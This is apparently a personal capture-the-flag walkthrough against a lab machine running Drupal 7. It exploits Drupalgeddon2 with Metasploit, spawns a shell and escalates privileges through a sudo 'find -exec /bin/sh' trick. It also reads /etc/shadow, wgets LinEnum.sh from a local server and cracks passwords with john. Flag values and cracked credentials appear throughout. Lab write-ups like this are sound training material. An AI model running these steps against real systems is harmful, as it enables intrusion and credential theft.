# Method: 1 Using http 80
## step: 1 Do nmap scans 
1. all port scan 
   - sudo nmap 10.10.10.10 -Pn -n -p-
	- PORT     STATE SERVICE
	- 22/tcp   open  ssh
	* 80/tcp   open  http
	- 6880/tcp open  unknown
done 

2. .   Service  version scan 
   - sudo nmap 10.10.10.10 -Pn -n -p 22,80  -sV 
	- PORT   STATE SERVICE VERSION
	* 22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
	- 80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
## Step: 2 Checking for any verbalities 

search using http
http://10.10.10.10/includes/session.inc
Found it is using drupal
2. waplizer 
### Exploit Drupal 7 (Drupalgeddon2)

- Drupal 7 is vulnerable to a critical remote code execution vulnerability known as Drupalgeddon2 (CVE-2018-7600):

```
msfconsole
use exploit/multi/http/drupal_drupageddon
use exploit/unix/webapp/drupal_drupalgeddon2// not working 
set RHOST 10.10.10.10
set RPORT 80
set TARGETURI /
exploit
```

- To Spawns a new Bash shell 
	- python -c 'import pty; pty.spawn("/bin/bash")'
	- bash -p


- TO view users 
	 - cat /etc/passwd | grep /bin/bash
	- result
		- root:x:0:0:root:/root:/bin/bash
		- harry:x:1001:1001:Harry,,,:/home/harry:/bin/bash
		- jack:x:1000:1000:Jack,,,:/home/jack:/bin/bash
- Look for privilege escalation
	- sudo -l
	- find / -perm -u=s -type f 2>/dev/null

## Step: 3 User login

- To log in as harry 
	- sudo -u harry /usr/bin/find . -exec /bin/sh \; -quit

- Search for flags 
- cd /home/jack
	- cat flag1.txt
	- flag1{08d654b2513615d30fe80f8a36e6425c}
- cd /home/harry
	- cat flag2.txt
	- flag2{01f8810dee3c2aa810f6db90af182d2b}
- To find **Exploit Misconfigured File Permissions**
	- find / -perm -4000 2>/dev/null
	
- To get Privilege Escalation or  become root user run this
	- run
		- /usr/bin/What_are/you/_searching_/for?/iamhere
		  


### Extra step
- search for 
	- /etc/shadow 
	- save password files in desktop
- To setup hhtp server 
	- sudo python3 -m  http.server  80
	- wget http://10.10.10.4/LinEnum.sh
	- sudo python3 -m  http.server  50
- password crack using john 
	- the you get 
	-  Username: jack     Password: kcaj           
## Step: 4 Final flag 

- The final flag
	- root@HackerSchool:/# cd root
	- root@HackerSchool:/root# ls
		- finalflag.txt
	- root@HackerSchool:/root# cat finalflag.txt
		- root-flag{bbe4bc6f660e82677ed07254732eb6b3}

# Method: 
login ftp using ftp 
search exploit = searchsploit Drupal 7






admin@123
CAP 
wire shark 